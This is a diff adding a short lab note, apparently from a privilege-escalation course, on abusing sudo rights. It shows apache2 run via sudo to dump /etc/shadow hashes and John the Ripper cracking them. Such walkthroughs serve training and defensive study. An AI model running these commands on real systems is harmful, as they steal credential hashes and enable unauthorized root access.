@@ -1,0 +1,36 @@
+Privilege Escalation - SUDO - Abusing Intended Functionality
+=============================================================
+
+LAB:
+1. in the command prompt type:
+sudo -l
+It lists:
+
+Matching Defaults entries for TCM on this host:
+    env_reset, env_keep+=LD_PRELOAD
+
+User TCM may run the following commands on this host:
+    (root) NOPASSWD: /usr/sbin/iftop
+    (root) NOPASSWD: /usr/bin/find
+    (root) NOPASSWD: /usr/bin/nano
+    (root) NOPASSWD: /usr/bin/vim
+    (root) NOPASSWD: /usr/bin/man
+    (root) NOPASSWD: /usr/bin/awk
+    (root) NOPASSWD: /usr/bin/less
+    (root) NOPASSWD: /usr/bin/ftp
+    (root) NOPASSWD: /usr/bin/nmap
+    (root) NOPASSWD: /usr/sbin/apache2
+    (root) NOPASSWD: /bin/more
+
+We will exploit /usr/sbin/apache2
+We will run /etc/shadow file  as configure file of apache2 and lists contents of /etc/shadow
+
+2. 
+sudo apache2 -f /etc/shadow
+
+3. Copy content of /etc/shadow and paste in attackbox file.
+
+4.Now using john we will crack the password
+
+john --wordlist=/usr/share/wordlists/nmap.lst hash.txt
+
